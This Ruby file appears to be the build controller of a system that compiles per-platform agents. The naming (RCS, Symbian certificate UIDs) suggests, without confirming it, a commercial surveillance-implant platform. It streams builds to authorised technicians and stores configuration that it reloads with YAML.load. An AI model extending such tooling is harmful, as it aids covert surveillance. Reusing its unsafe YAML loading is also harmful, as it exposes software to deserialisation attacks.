#
# Controller for Build
#

require_relative '../build'

module RCS
module DB

class BuildController < RESTController

  def create
    require_auth_level :tech

    platform = @params['platform']

    # if we are in archive mode, no build is allowed
    return conflict('LICENSE_LIMIT_REACHED') if LicenseManager.instance.check :archive

    # instantiate the correct builder
    begin
      build = Build.factory(platform.to_sym)
    rescue Exception => e
      return not_found(e.message)
    end

    begin
      build.create @params

      trace :info, "Output: #{build.outputs} #{File.size(build.path(build.outputs.first)).to_s_bytes}"

      return stream_file(build.path(build.outputs.first), proc { build.clean })
    rescue Exception => e
      return server_error(e.message)
    end

  end


  def symbian_conf
    require_auth_level :tech

    unless @params.empty?
      if not @params['uids'].empty?
        File.open(Config.instance.cert("symbian.uids"), 'wb') {|f| f.write @params['uids'].to_yaml}
      end
    end

    # retrieve the current conf and return it
    current_conf = {}

    if File.exist? Config.instance.cert('symbian.uids')
      yaml = File.open(Config.instance.cert("symbian.uids"), 'rb') {|f| f.read}
      uids = YAML.load(yaml)

      # the UIDS must be 8 chars (padded with zeros)
      uids.collect! {|u| u.rjust(8, '0')}
      current_conf[:uids] = uids
    else
      current_conf[:uids] = []
    end

    return ok(current_conf)
  end

end

end #DB::
end #RCS::